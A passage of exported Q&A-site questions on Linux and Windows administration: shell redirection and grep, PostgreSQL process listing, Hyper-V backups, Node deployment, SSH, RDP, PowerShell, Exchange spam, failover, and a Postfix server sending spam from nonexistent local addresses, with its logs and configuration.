<pre class=""lang-sh prettyprint-override""><code>ls ""${paths[@]}"" 1&gt;/dev/null
</code></pre>

<p>Shows:</p>

<blockquote>
  <p>ls: cannot access '/foo/missing1': No such file or directory</p>
</blockquote>

<p>Good. Now I want to clean this up:</p>

<pre class=""lang-sh prettyprint-override""><code>ls ""${paths[@]}"" 1&gt;/dev/null | sed 's/ls: cannot access //' | sed 's/: No such file or directory//''
</code></pre>

<p>But I get:</p>

<blockquote>
  <p>ls: cannot access '/foo/missing1': No such file or directory<br>
  /foo/exists1<br>
  /foo/exists2</p>
</blockquote>

<p>So the <code>sed</code> doesn't work, and existing files are also shown.</p>

<p>Why does that happen (why does it ignore the <code>1&gt;/dev/null</code>), and how do I fix this?</p>
","<linux><bash><sed>","2020-04-19 07:00:12"
"1013067","How to grep lines only with matched words in Linux","<p>I have a little question.
I have a list of processes.
After this command</p>

<pre><code>ps aux | grep postgres
</code></pre>

<p>I see</p>

<pre><code>postgres  1178  0.0  0.2 320064 27060 ?        S    Apr12   0:05 /usr/lib/postgresql/10/bin/postgres -D /var/lib/postgresql/10/main -c config_file=/etc/postgresql/10/main/postgresql.conf
postgres  1314  0.0  0.0 320176  7052 ?        Ss   Apr12   0:00 postgres: 10/main: checkpointer process
postgres  1315  0.0  0.0 320064  4060 ?        Ss   Apr12   0:04 postgres: 10/main: writer process
postgres  1316  0.0  0.0 320064  9020 ?        Ss   Apr12   0:04 postgres: 10/main: wal writer process
postgres  1317  0.0  0.0 320464  6760 ?        Ss   Apr12   0:03 postgres: 10/main: autovacuum launcher process
postgres  1319  0.0  0.0 174988  3376 ?        Ss   Apr12   0:03 postgres: 10/main: stats collector process
postgres  1321  0.0  0.0 320372  4972 ?        Ss   Apr12   0:00 postgres: 10/main: bgworker: logical replication launcher
999       2477  0.0  0.1 273936 22668 ?        Ss   Apr12   0:07 postgres
999       2486  0.0  0.1 288608 24256 ?        Ss   Apr12   0:34 postgres
999       2519  0.0  0.1 287476 23424 ?        Ss   Apr12   0:08 postgres
999       2560  0.0  0.1 274540 23076 ?        Ss   Apr12   0:07 postgres
70        2584  0.0  0.1 189856 19624 ?        Ss   Apr12   0:05 postgres
999       2704  0.0  0.3 484860 40132 ?        Ss   Apr12   0:16 postgres
999       3173  0.0  0.2 213860 26000 ?        Ss   Apr12   0:13 postgres
999       3361  0.0  0.5 746652 73252 ?        Ss   Apr12   0:17 postgres
999       3401  0.0  0.1 288252 24500 ?        Ss   Apr12   0:09 postgres
999       4743  0.0  0.1 213992 19184 ?        Ss   Apr12   0:00 postgres: checkpointer
999       4744  0.0  0.0 213860  5760 ?        Ss   Apr12   0:05 postgres: background writer
999       4745  0.0  0.0 213860 10044 ?        Ss   Apr12   0:05 postgres: walwriter
999       4746  0.0  0.0 214536  8332 ?        Ss   Apr12   0:08 postgres: autovacuum launcher
999       4747  0.0  0.0  68552  5508 ?        Ss   Apr12   1:30 postgres: stats collector
999       4748  0.0  0.0 214284  6612 ?        Ss   Apr12   0:00 postgres: logical replication launcher
999       4749  0.0  0.0 287596  7804 ?        Ss   Apr12   0:00 postgres: checkpointer process
999       4750  0.0  0.0 287476  3756 ?        Ss   Apr12   0:04 postgres: writer process
999       4751  0.0  0.0 287476  8232 ?        Ss   Apr12   0:04 postgres: wal writer process
999       4752  0.0  0.0 287884  6480 ?        Ss   Apr12   0:05 postgres: autovacuum launcher process
999       4753  0.0  0.0 142608  2872 ?        Ss   Apr12   0:14 postgres: stats collector process
999       4762  0.0  0.1 288368 13500 ?        Ss   Apr12   0:00 postgres: checkpointer process
999       4763  0.0  0.0 288252  5760 ?        Ss   Apr12   0:05 postgres: writer process
999       4764  0.0  0.0 288252  8420 ?        Ss   Apr12   0:05 postgres: wal writer process
999       4765  0.0  0.0 288664  6396 ?        Ss   Apr12   0:06 postgres: autovacuum launcher process
999       4766  0.0  0.0 143300  3704 ?        Ss   Apr12   0:15 postgres: stats collector process
999       4790  0.0  0.0 288544  4520 ?        Ss   Apr12   0:00 postgres: bgworker: logical replication launcher
999       4793  0.0  0.0 274640  6384 ?        Ss   Apr12   0:00 postgres: checkpointer process
999       4794  0.0  0.0 274540  5228 ?        Ss   Apr12   0:02 postgres: writer process
999       4795  0.0  0.0 274540  8436 ?        Ss   Apr12   0:02 postgres: wal writer process
999       4796  0.0  0.0 274928  6296 ?        Ss   Apr12   0:05 postgres: autovacuum launcher process
999       4797  0.0  0.0 129656  2816 ?        Ss   Apr12   0:14 postgres: stats collector process
999       4801  0.0  0.0 274064  6248 ?        Ss   Apr12   0:00 postgres: checkpointer process
999       4802  0.0  0.0 273936  5064 ?        Ss   Apr12   0:02 postgres: writer process
999       4803  0.0  0.0 273936  8140 ?        Ss   Apr12   0:02 postgres: wal writer process
999       4804  0.0  0.0 274352  5776 ?        Ss   Apr12   0:05 postgres: autovacuum launcher process
999       4805  0.0  0.0 129216  2700 ?        Ss   Apr12   0:13 postgres: stats collector process
70        4816  0.0  0.0 189856  4940 ?        Ss   Apr12   0:00 postgres: checkpointer process
70        4817  0.0  0.0 189856  2640 ?        Ss   Apr12   0:05 postgres: writer process
70        4818  0.0  0.0 189856  6820 ?        Ss   Apr12   0:05 postgres: wal writer process
70        4819  0.0  0.0 190184  4940 ?        Ss   Apr12   0:05 postgres: autovacuum launcher process
70        4820  0.0  0.0  44788  2364 ?        Ss   Apr12   0:15 postgres: stats collector process
70        4858  0.0  0.0 190068  3644 ?        Ss   Apr12   0:00 postgres: bgworker: logical replication launcher
999       4872  0.0  0.4 288816 56476 ?        Ss   Apr12   0:02 postgres: checkpointer
999       4873  0.0  0.0 288608  8836 ?        Ss   Apr12   0:05 postgres: background writer
999       4874  0.0  0.0 288608  8148 ?        Ss   Apr12   0:08 postgres: walwriter
999       4875  0.0  0.0 289172  6880 ?        Ss   Apr12   0:21 postgres: autovacuum launcher
999       4876  0.0  0.0 144064  4104 ?        Ss   Apr12   2:01 postgres: stats collector
999       4881  0.0  0.0 288896  4252 ?        Ss   Apr12   0:00 postgres: logical replication launcher
999       4972  0.0  0.0 485020  5948 ?        Ss   Apr12   0:00 postgres: checkpointer
999       4973  0.0  0.0 485004  6320 ?        Ss   Apr12   0:05 postgres: background writer
999       4974  0.0  0.1 484860 13844 ?        Ss   Apr12   0:04 postgres: walwriter
999       4975  0.0  0.0 485464  6252 ?        Ss   Apr12   0:06 postgres: autovacuum launcher
999       4976  0.0  0.0 143660  2948 ?        Ss   Apr12   0:18 postgres: stats collector
999       4977  0.0  0.0 485276  4400 ?        Ss   Apr12   0:00 postgres: logical replication launcher
999       4979  0.0  0.0 747036 10456 ?        Ss   Apr12   0:00 postgres: checkpointer
999       4980  0.0  0.0 746912  6384 ?        Ss   Apr12   0:05 postgres: background writer
999       4981  0.0  0.1 746652 20856 ?        Ss   Apr12   0:04 postgres: walwriter
999       4982  0.0  0.0 747748  6188 ?        Ss   Apr12   0:03 postgres: autovacuum launcher
999       4983  0.0  0.0 143524  3020 ?        Ss   Apr12   0:10 postgres: stats collector
999       4984  0.0  0.0 747592  4492 ?        Ss   Apr12   0:00 postgres: logical replication launcher
root     54090  0.0  0.0  14428  1080 pts/0    S+   20:11   0:00 grep --color=auto postgres
</code></pre>

<p>I need to see only these lines:</p>

<pre><code>999       2477  0.0  0.1 273936 22668 ?        Ss   Apr12   0:07 postgres
999       2486  0.0  0.1 288608 24256 ?        Ss   Apr12   0:34 postgres
999       2519  0.0  0.1 287476 23424 ?        Ss   Apr12   0:08 postgres
999       2560  0.0  0.1 274540 23076 ?        Ss   Apr12   0:07 postgres
70        2584  0.0  0.1 189856 19624 ?        Ss   Apr12   0:05 postgres
999       2704  0.0  0.3 484860 40132 ?        Ss   Apr12   0:16 postgres
999       3173  0.0  0.2 213860 26000 ?        Ss   Apr12   0:13 postgres
999       3361  0.0  0.5 746652 73252 ?        Ss   Apr12   0:17 postgres
999       3401  0.0  0.1 288252 24500 ?        Ss   Apr12   0:09 postgres
</code></pre>

<p>How can I do this ? Could You help please ?</p>
","<linux><bash><shell><grep><awk>","2020-04-19 17:15:05"
"1013082","Differential Hyper-V backups with max file limit","<p>I am looking for a product that can take incremental or differential backups of running VMs on a hyper-v host and importantly can chunk or span the backups across multiple individual files no larger than a set limit in its backing store / backup directory.  In a very similar manner to how large files were chunked in the floppy disk/fat16/fat32 era.</p>

<p>The reason for this is that our backing store will only accept individual files less than 400Gb and several vhdx's are larger than that.  Loads of products out there but none I can find with this important feature.</p>

<p>Thanks!</p>
","<backup><virtualization><virtual-machines><hyper-v>","2020-04-19 18:41:05"
"1013104","Deploy node app locally in Australia","<p>I developed a web application for a company. It's a node app -- basically, all it needs is <code>npm install</code> and <code>npm start</code> to run. The app does need Puppetteer to run. DB wise, I am using JawsDb which can be located in Australia or the US. Right now it's in the US since the main server is in the US.</p>

<p>I am using Heroku at the moment, using the puppeteer-heroku buildpack. However, right now <em>all</em> of the users are in Australia, whereas the app is hosted in the US. This is proving bad -- especially last night, when the submarine link went down and traffic to the US was going through India -> Europe (it took about 2 minutes to download 1Mb).</p>

<p>I obviously need to deploy this in Australia somehow. Heroku does offer location of servers in Australia, but only for ""private spaces"" and enterprise customers. I emailed them, basically begging for a local Australian deployment, but I don't like my chances.</p>

<p>On one hand, Heroku really does everything for you -- click on one button, and you have the perfect environment with the buildpack installed. On the other hand, there is a lot more that can go wrong.</p>

<p>What are my options? I am considering these:</p>

<ul>
<li><p>Get a Linux server from Amazon and install node on it. I've done it before. But, it would be another server to maintain. Also, I would need to install NginX as a reverse proxy etc. etc. Before I know it, I've entered sysadmin hell. Plus, scaling will be a problem later on.</p></li>
<li><p>Use Amazon directly. I heard that Amazon does have a system where you submit a node app ""as is"" and they provide the right environment for it. However, I can't find it. Hints?</p></li>
<li><p>Find a service equivalent to Heroku where I can deploy the software. However, it will need to be something that allows buildpacks so that it can run Puppetteer.</p></li>
</ul>

<p>What would you do?</p>
","<amazon-web-services><deployment><heroku>","2020-04-19 21:21:52"
"1013285","SSH server wont start before GUI login om Kubuntu 18.04","<p>I have tried all the steps in  <a href=""https://askubuntu.com/questions/3913/start-ssh-server-on-boot"">https://askubuntu.com/questions/3913/start-ssh-server-on-boot</a> to no avail.</p>

<p>I want to be able to login via SSH on my tablet over the WiFi connection.  It works after being logged in at the physical machine but not before.  Otherwise it just comes up with connection refused.</p>

<p>Any ideas what to try next?</p>
","<ssh><kubuntu>","2020-04-20 21:11:54"
"803051","What are the basic steps to start blocking spam on an internal Exchange 2016 server?","<p>Recently I have taken over as both onsite IT and also head of our internal IT as the last IT guy resigned on my second day. Currently they just switched to an internal Exchange 2016 server and they're getting tons of spam now. I just barely figured out how to get the SSL cert setup correct and fix all the cert errors being thrown around. </p>

<p>I know there are basic anti-spam features in Exchange 2016, but I was wondering if anyone had some general guidelines on how to start off. I didn't want to enable all the filtering without having a solid grasp of what I'm doing since I'm not even sure how to check what emails were blocked in case I am blocking important customer emails. Any anti-spam advice in general for Exchange 2016 would be appreciated. Thanks! </p>
","<email><email-server><spam-filter><content-filter><exchange-2016>","2016-09-14 16:52:07"
"1013329","Failover between two internally hosted, geographically seperate web servers","<p>We have a web application hosted on an internal windows vm.  Our company has a number of bases around the country, each with it's own server rack, and the base LANs are linked together in a big intranet.</p>

<p>Presently this app is hosted on a server at HQ, but it had a power cut today.  The power company scheduled it a few weeks ago and notified us by slipping a piece of paper under the door.  But the country is in Covid19 lockdown so the IT contractors found out about it about an hour before it began.  The first I (lead developer of this application) heard about it was an hour into the outage when the UPS's had an hour of run time left.  The contractor managed to fail the vm over to another server in another base (which takes backups anyway so it was relatively straightforward to trigger another snapshot before the batteries went flat, and fire up the VM in the other base).</p>

<p>Anyway, while I was pretty stoked they were able to transfer it so quickly (including the internet facing hostname somehow), we hadn't done it for real before and I didn't expect it to work.</p>

<p>The question I have is, what's the best way to have two instances of the app running on two seperate servers that are sort of in the same intranet, but have their own independent internet connections, and have the hostname failover to the alternate server in case the primary goes down?  If a reverse proxy is the answer, where do we put it?  Because that's a new single point failure isn't it?  It must handle the possibility of either server and it's entire base going dark, like what happened to us today.</p>

<p>Keeping the primary/alternate databases in sync is a problem that is easy to solve, our guys can manage that.</p>

<p>If you all just want to scream HOST IT IN AZURE INSTEAD that's fine, I'm keen on that too.  I haven't managed to convince management that's a good idea yet.  Something about data ownership they reckon.  Never mind that a bunch of third party systems they use with just as confidential data is hosted in the cloud.</p>

<p>Finally, I'm not an infrastructure guy, the brains behind the company's IT left a few months ago and the IT contractors don't have a lot to do with high availability infrastructure.  I am hoping to use this event to get some real positive improvements.</p>
","<high-availability><failover>","2020-04-21 07:30:29"
"803052","Why would using MongoDB in lieu of etcd as a key value store be a good or bad idea?","<p>I'd like to get general thoughts from the community as to why MongoDB for key/value would OR would not be a suitable replacement for etcd or other purpose-built key/value store system (consol, zookeeper, etc).</p>
","<mongodb><zookeeper><etcd><consul>","2016-09-14 16:54:39"
"1013361","FileSize column empty in Powershell files listing","<p>I have windows 10 (Ver 1909). When I issue following CMD, it works fine with proper FILESIZE column.</p>

<p><strong>Win 10 PS version:</strong> </p>

<pre><code>Major  Minor  Build  Revision
-----  -----  -----  --------
5      1      18362  752

PS C:\backup&gt; Get-ChildItem -path c:\temp\*.* -Filter *.ps1 | select name,FileSize,lastwritetime,CreationTime | sort LastWriteTime -descending

Name                                   FileSize LastWriteTime         CreationTime
----                                   -------- -------------         ------------
test.ps1                               1.82 KB  02/06/2019 9:20:47 AM 10/02/2018 8:52:42 AM
test2.ps1                              899  B   02/06/2019 8:17:38 AM 02/06/2019 8:17:37 AM
getlastlogon with server name also.ps1 1.50 KB  02/06/2019 8:13:01 AM 02/06/2019 8:13:01 AM
MyTypes.ps1xml                         1.01 KB  12/11/2018 4:34:10 PM 12/11/2018 4:34:01 PM
Get-LockedOutLocation.ps1              4.70 KB  10/02/2018 9:07:36 AM 10/02/2018 9:07:36 AM
</code></pre>

<p>But if I Issue this command on windows 2008 server, FILESIZE column is always empty.</p>

<pre><code>Major  Minor  Build  Revision
-----  -----  -----  --------
5      1      14409  1005

PS C:\Users\barcode&gt; Get-ChildItem -path c:\temp\*.*  | select name,FileSize,lastwritetime,CreationTime | sort LastWrite
Time -descending

Name                                FileSize LastWriteTime         CreationTime
----                                -------- -------------         ------------
PS5-Win7AndW2K8R2-KB3191566-x64.zip          4/21/2020 11:12:22 AM 4/21/2020 11:43:47 AM
barcode_new_Srv.bmp                          6/28/2018 8:40:12 AM  6/28/2018 8:33:25 AM
Install-WMF5.1.ps1                           1/18/2017 3:25:24 PM  4/21/2020 11:43:58 AM
Win7AndW2K8R2-KB3191566-x64.msu              1/13/2017 10:07:44 AM 4/21/2020 11:43:58 AM
</code></pre>

<p>I tried installing Ps7 also on W2008, but still the FILESIZE column is always empty.</p>
","<powershell>","2020-04-21 11:35:12"
"1013399","Unable to connect make remote desktop connection","<p>Here's the setup:</p>

<ul>
<li>My home machine, running Windows 7</li>
<li>First remote machine, also running Windows 7</li>
<li>Second remote machine, running Windows Server 2012 R2</li>
</ul>

<p>Both remotes are in local network (and in the same domain) to which I'm connecting from home by VPN. </p>

<p>Here's the problem: I can connect to the second remote with my domain login/pass, everything is peachy. However, when I try to connect to the first machine - connection just closes immediately! With no errors (at least, no obvious error windows or events log entries).</p>

<p>I tried several alternative clients for RDP and most of them behave the same way - connection just closes immediately (but RD Tabs claimed that it was ""Unable to authenticate using NLA""). I'm pretty sure that login/password are correct because I can connect to the second machine without reentering them.</p>

<p>Naturally I presumed that something is wrong with first remote. However, if I run Ubuntu in Virtualbox (on the same home machine, using the same VPN connection), I <em>can</em> connect to both remotes in Remmina! 
So the first one accepts RDP connections and my user has all the necessary permissions there.</p>

<p>I have run out of ideas.</p>
","<windows><windows-7><rdp>","2020-04-21 14:37:20"
"803105","Spam from unexisting address of my own domain with Postfix","<p>Since one week, i get lot of spams sent from my server, which using Postfix.
All these spams are sending from an mail address like this :</p>

<p>XXXXXX@ mywebsite . com</p>

<p>XXXXXXX = random name 
all these mail addresses didnt exist of course
but they can send spam (to aol, gmail, etc.)</p>

<p>I tried to block sending mail from domain, but it didnt work. (it works only when i send the mail from my existing mail address, but the spamers still can send spam...)
this link : serverfault.com/questions/517945/how-to-block-sending-mail-from-domain-in-postfix</p>

<p>Here is an extract of my dovecot log :
Code:</p>

<pre><code>Sep 10 18:51:04 auth-worker(27351): Info: sql(paula_thomas@ mywebsite . com): unknown user
</code></pre>

<p>each 4-5 minutes </p>

<p>From my mail.log : </p>

<pre><code>&gt; Sep 10 18:54:23 my-host postfix/qmgr[26436]: 1754037021E2:
&gt; from=&lt;grace_mcdonald@ mywebsite . com&gt;, size=1251, nrcpt=1 (queue
&gt; active) Sep 10 18:54:23 my-host postfix/lmtp[27584]: 028053701ECE:
&gt; to=&lt;audrey_lane@ mywebsite . com&gt;, relay=myhostname.
&gt; fr[private/dovecot-lmtp], delay=0.15, delays=0.09/0/0/0.07, dsn=5.1.1,
&gt; status=bounced (host myhostname. fr[private/dovecot-lmtp] said: 550
&gt; 5.1.1 &lt;audrey_lane@ mywebsite . com&gt; User doesn't exist: audrey_lane@ mywebsite . com (in reply to RCPT TO command)) Sep 10 18:54:23 my-host
&gt; postfix/pickup[27034]: 27DC83701E50: uid=5010 from=&lt;grace_mcdonald@
&gt; mywebsite . com&gt; Sep 10 18:54:23 my-host postfix/cleanup[27220]:
&gt; 27DC83701E50: message-id=&lt;c7f61a098fd9f9ec2e1dc242d57be877@ mywebsite
&gt; . fr&gt; Sep 10 18:54:23 my-host postfix/qmgr[26436]: 27DC83701E50:
&gt; from=&lt;grace_mcdonald@ mywebsite . com&gt;, size=1220, nrcpt=1 (queue
&gt; active) Sep 10 18:54:23 my-host postfix/pickup[27034]: 3BC733701DBD:
&gt; uid=5010 from=&lt;audrey_lane@ mywebsite . com&gt; Sep 10 18:54:23 my-host
&gt; postfix/cleanup[27259]: 3BC733701DBD:
&gt; message-id=&lt;67ee6823a83f3bb73e5f5717c2905be5@ mywebsite . fr&gt; Sep 10
&gt; 18:54:23 my-host postfix/qmgr[26436]: 3BC733701DBD: from=&lt;audrey_lane@
&gt; mywebsite . com&gt;, size=1238, nrcpt=1 (queue active) Sep 10 18:54:23
&gt; my-host postfix/pickup[27034]: 577763701DC6: uid=5010
&gt; from=&lt;audrey_lane@ mywebsite . com&gt; Sep 10 18:54:23 my-host
&gt; postfix/cleanup[27220]: 577763701DC6:
&gt; message-id=&lt;ce07dac8196b58ab895833ffe69be4e5@ mywebsite . fr&gt; Sep 10
&gt; 18:54:23 my-host postfix/qmgr[26436]: 577763701DC6: from=&lt;audrey_lane@
&gt; mywebsite . com&gt;, size=1239, nrcpt=1 (queue active) Sep 10 18:54:23
&gt; my-host postfix/pickup[27034]: 6A1B7370229E: uid=5010
&gt; from=&lt;audrey_lane@ mywebsite . com&gt; Sep 10 18:54:23 my-host
&gt; postfix/cleanup[27259]: 6A1B7370229E:
&gt; message-id=&lt;e1e88d4dc65dce78da6a03b8e165624a@ mywebsite . fr&gt; Sep 10
&gt; 18:54:23 my-host postfix/qmgr[26436]: 6A1B7370229E: from=&lt;audrey_lane@
&gt; mywebsite . com&gt;, size=1219, nrcpt=1 (queue active) Sep 10 18:54:23
&gt; my-host postfix/pickup[27034]: 746EA3701D7C: uid=5010
&gt; from=&lt;audrey_lane@ mywebsite . com&gt; Sep 10 18:54:23 my-host
&gt; postfix/cleanup[27220]: 746EA3701D7C:
&gt; message-id=&lt;b6380a13f78128602b3fce4ebc69b369@ mywebsite . fr&gt; Sep 10
&gt; 18:54:23 my-host postfix/qmgr[26436]: 746EA3701D7C: from=&lt;audrey_lane@
&gt; mywebsite . com&gt;, size=1237, nrcpt=1 (queue active) Sep 10 18:54:23
&gt; my-host postfix/smtp[27253]: 847553701DD2: to=&lt;jamie.innes93@
&gt; hotmail.co.uk&gt;, relay=mx3.hotmail.com[65.55.33.135]:25, delay=2.7,
&gt; delays=0.68/0/1.4/0.53, dsn=2.0.0, status=sent (250
&gt; &lt;c0b1f97f035a4ee8f10ebf8a93e350d9@ mywebsite . fr&gt; Queued mail for
&gt; delivery) Sep 10 18:54:23 my-host postfix/lmtp[27291]: 99B0C3701DD2:
&gt; to=&lt;grace_mcdonald@ mywebsite . com&gt;, relay=myhostname.
&gt; fr[private/dovecot-lmtp], delay=0.15, delays=0.06/0/0/0.09, dsn=5.1.1,
&gt; status=bounced (host myhostname. fr[private/dovecot-lmtp] said: 550
&gt; 5.1.1 &lt;grace_mcdonald@ mywebsite . com&gt; User doesn't exist: grace_mcdonald@ mywebsite . com (in reply to RCPT TO command)) Sep 10
&gt; 18:54:23 my-host postfix/lmtp[27584]: A85D537022BB:
&gt; to=&lt;grace_mcdonald@ mywebsite . com&gt;, relay=myhostname.
&gt; fr[private/dovecot-lmtp], delay=0.14, delays=0.09/0/0/0.04, dsn=5.1.1,
&gt; status=bounced (host myhostname. fr[private/dovecot-lmtp] said: 550
&gt; 5.1.1 &lt;grace_mcdonald@ mywebsite . com&gt; User doesn't exist: grace_mcdonald@ mywebsite . com (in reply to RCPT TO command)) Sep 10
&gt; 18:54:23 my-host postfix/lmtp[27291]: D86373701D29:
&gt; to=&lt;grace_mcdonald@ mywebsite . com&gt;, relay=myhostname.
&gt; fr[private/dovecot-lmtp], delay=0.06, delays=0.03/0/0/0.03, dsn=5.1.1,
&gt; status=bounced (host myhostname. fr[private/dovecot-lmtp] said: 550
&gt; 5.1.1 &lt;grace_mcdonald@ mywebsite . com&gt; User doesn't exist: grace_mcdonald@ mywebsite . com (in reply to RCPT TO command)) Sep 10
&gt; 18:54:24 my-host postfix/lmtp[27584]: 255483701DD2: to=&lt;audrey_lane@
&gt; mywebsite . com&gt;, relay=myhostname. fr[private/dovecot-lmtp],
&gt; delay=0.07, delays=0.03/0/0/0.03, dsn=5.1.1, status=bounced (host
&gt; myhostname. fr[private/dovecot-lmtp] said: 550 5.1.1 &lt;audrey_lane@
&gt; mywebsite . com&gt; User doesn't exist: audrey_lane@ mywebsite . com (in
&gt; reply to RCPT TO command)) Sep 10 18:54:24 my-host
&gt; postfix/smtp[27246]: 72DF63702308: to=&lt;galipete@ msn.com&gt;,
&gt; relay=mx1.hotmail.com[65.55.92.136]:25, delay=2.3,
&gt; delays=0.54/0/1.4/0.41, dsn=2.0.0, status=sent (250
&gt; &lt;ca761254081f994ec23ef61df24a0761@ mywebsite . fr&gt; Queued mail for
&gt; delivery) Sep 10 18:54:24 my-host postfix/smtp[27280]: B31E43701E88:
&gt; to=&lt;leirbag22@ hotmail.com&gt;, relay=mx4.hotmail.com[65.55.92.168]:25,
&gt; delay=2.3, delays=0.79/0/1.1/0.41, dsn=2.0.0, status=sent (250
&gt; &lt;fab1aae28bfdd94e83cab45536ed995b@ mywebsite . fr&gt; Queued mail for
&gt; delivery) Sep 10 18:54:24 my-host postfix/smtp[27711]: 949E0370231B:
&gt; to=&lt;thebestcj18@ hotmail.com&gt;, relay=mx1.hotmail.com[65.54.188.94]:25,
&gt; delay=2.4, delays=0.47/0/1.4/0.52, dsn=2.0.0, status=sent (250
&gt; &lt;66f45a301693aaffd963970cf505ad0b@ mywebsite . fr&gt; Queued mail for
&gt; delivery) Sep 10 18:54:25 my-host postfix/smtp[27253]: 746EA3701D7C:
&gt; to=&lt;e_romero_0606@ live.com&gt;, relay=mx3.hotmail.com[207.46.8.199]:25,
&gt; delay=3, delays=1.1/0.01/1.3/0.51, dsn=2.0.0, status=sent (250
&gt; &lt;b6380a13f78128602b3fce4ebc69b369@ mywebsite . fr&gt; Queued mail for
&gt; delivery) Sep 10 18:54:25 my-host postfix/smtp[27300]: 577763701DC6:
&gt; to=&lt;rpmccreary@ hotmail.com&gt;, relay=mx1.hotmail.com[65.55.33.135]:25,
&gt; delay=3, delays=0.93/0/1.4/0.62, dsn=2.0.0, status=sent (250
&gt; &lt;ce07dac8196b58ab895833ffe69be4e5@ mywebsite . fr&gt; Queued mail for
&gt; delivery)
</code></pre>

<p>All mails contains links (porno, poker, etc.)</p>

<p>Here is my config file : /etc/postfix/main.cf</p>

<pre><code>Code:
#######################
## GENERALS SETTINGS ##
#######################

smtpd_banner         = $myhostname ESMTP $mail_name (Debian/GNU)
biff                 = no
append_dot_mydomain  = no
readme_directory     = no
delay_warning_time   = 4h
mailbox_command      = procmail -a ""$EXTENSION""
recipient_delimiter  = +
disable_vrfy_command = yes
message_size_limit   = 502400000
mailbox_size_limit   = 1024000000

inet_interfaces = all
inet_protocols = ipv4

myhostname    = mon.domaine.fr
myorigin      = mon.domaine.fr
mydestination = localhost localhost.$mydomain
mynetworks    = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128
relayhost     =

alias_maps     = hash:/etc/aliases
alias_database = hash:/etc/aliases

####################
## TLS PARAMETERS ##
####################
# Smtp ( OUTGOING / Client )
smtp_tls_loglevel            = 1
smtp_tls_security_level      = may
#smtp_tls_CAfile              = /etc/ssl/certs/ca.cert.pem
smtp_tls_protocols           = !SSLv2, !SSLv3
smtp_tls_mandatory_protocols = !SSLv2, !SSLv3
smtp_tls_mandatory_ciphers   = high
smtp_tls_exclude_ciphers     = aNULL, eNULL, EXPORT, DES, 3DES, RC2, RC4, MD5, PSK, SRP, DSS, AECDH, ADH
smtp_tls_note_starttls_offer = yes

# ---------------------------------------------------------------------------------------------------

# Smtpd ( INCOMING / Server )
smtpd_tls_loglevel            = 1
#smtpd_tls_auth_only           = yes
smtpd_tls_security_level      = may
smtpd_tls_received_header     = yes
smtpd_tls_protocols           = !SSLv2, !SSLv3
smtpd_tls_mandatory_protocols = !SSLv2, !SSLv3
smtpd_tls_mandatory_ciphers   = medium

# Infos (voir : postconf -d)
# Medium cipherlist = aNULL:-aNULL:ALL:!EXPORT:!LOW:+RC4:@ STRENGTH
# High cipherlist   = aNULL:-aNULL:ALL:!EXPORT:!LOW:!MEDIUM:+RC4:@ STRENGTH

# smtpd_tls_exclude_ciphers   = NE PAS modifier cette directive pour des raisons de compatibilité
#                               avec les autres serveurs de mail afin d'éviter une erreur du type
#                               ""no shared cipher"" ou ""no cipher overlap"" puis un fallback en
#                               plain/text...
# smtpd_tls_cipherlist        = Ne pas modifier non plus !

#smtpd_tls_CAfile              = $smtp_tls_CAfile
#smtpd_tls_cert_file           = /etc/ssl/certs/mailserver.crt
#smtpd_tls_key_file            = /etc/ssl/private/mailserver.key
smtp_tls_CAfile                 = /etc/letsencrypt/live/myhostname. fr/chain.pem
smtpd_tls_cert_file             = /etc/letsencrypt/live/myhostname. fr/cert.pem
smtpd_tls_key_file              = /etc/letsencrypt/live/myhostname. fr/privkey.pem
smtpd_tls_dh1024_param_file   = $config_directory/dh2048.pem
smtpd_tls_dh512_param_file    = $config_directory/dh512.pem

tls_preempt_cipherlist = yes
tls_random_source      = dev:/dev/urandom

smtp_tls_session_cache_database  = btree:${data_directory}/smtp_scache
smtpd_tls_session_cache_database = btree:${data_directory}/smtpd_scache
lmtp_tls_session_cache_database  = btree:${data_directory}/lmtp_scache

# ----------------------------------------------------------------------

#####################
## SASL PARAMETERS ##
#####################

smtpd_sasl_auth_enable          = yes
#smtp_sasl_auth_enable          = yes
smtpd_sasl_type                 = dovecot
smtpd_sasl_path                 = private/auth
smtpd_sasl_security_options     = noanonymous
smtpd_sasl_tls_security_options = $smtpd_sasl_security_options
smtpd_sasl_local_domain         = $mydomain
smtpd_sasl_authenticated_header = yes

broken_sasl_auth_clients = yes

##############################
## VIRTUALS MAPS PARAMETERS ##
##############################

virtual_uid_maps        = static:5000
virtual_gid_maps        = static:5000
virtual_minimum_uid     = 5000
virtual_mailbox_base    = /var/mail
virtual_transport       = lmtp:unix:private/dovecot-lmtp
virtual_mailbox_domains = mysql:/etc/postfix/mysql-virtual-mailbox-domains.cf
virtual_mailbox_maps    = mysql:/etc/postfix/mysql-virtual-mailbox-maps.cf
virtual_alias_maps      = mysql:/etc/postfix/mysql-virtual-alias-maps.cf

######################
## ERRORS REPORTING ##
######################
######################

# notify_classes = bounce, delay, resource, software
notify_classes = resource, software

error_notice_recipient     = me@ gmail. com
# delay_notice_recipient   = admin@ domain. tld
# bounce_notice_recipient  = admin@ domain. tld
# 2bounce_notice_recipient = admin@ domain. tld

##################
## RESTRICTIONS ##
##################

smtpd_recipient_restrictions =
     check_sender_access hash:/etc/postfix/rejected-recipient,
     reject_invalid_hostname,
     reject_unauth_pipelining,
     # permit_mynetworks,
     permit_sasl_authenticated,
     reject_non_fqdn_recipient,
     reject_unauth_destination,
     reject_unknown_recipient_domain,
     reject_rbl_client zen.spamhaus. org

smtpd_helo_restrictions =
     permit_mynetworks,
     permit_sasl_authenticated,
     reject_invalid_helo_hostname,
     reject_non_fqdn_helo_hostname
     # reject_unknown_helo_hostname

smtpd_client_restrictions =
     permit_mynetworks,
     permit_inet_interfaces,
     permit_sasl_authenticated,
     # reject_plaintext_session,
     # reject_unauth_pipelining

smtpd_sender_restrictions =
     check_sender_access hash:/etc/postfix/rejected-recipient,
     reject_non_fqdn_sender,
     reject_unknown_sender_domain
     #reject_sender_login_mismatch

smtpd_milters = unix:/opendkim/opendkim.sock, unix:/opendmarc/opendmarc.sock, unix:/clamav/clamav-milter.ctl
mime_header_checks = regexp:/etc/postfix/header_checks
header_checks = regexp:/etc/postfix/header_checks
</code></pre>

<p>In this config, i have updated to this configuration (just added reject_rbl options) :
this link : howtoforge . com/block_spam_at_mta_level_postfix</p>

<p>So i have added :</p>

<pre><code>##################
## RESTRICTIONS ##
##################

smtpd_helo_required = yes
disable_vrfy_command = yes
strict_rfc821_envelopes = yes
invalid_hostname_reject_code = 554
multi_recipient_bounce_reject_code = 554
non_fqdn_reject_code = 554
relay_domains_reject_code = 554
unknown_address_reject_code = 554
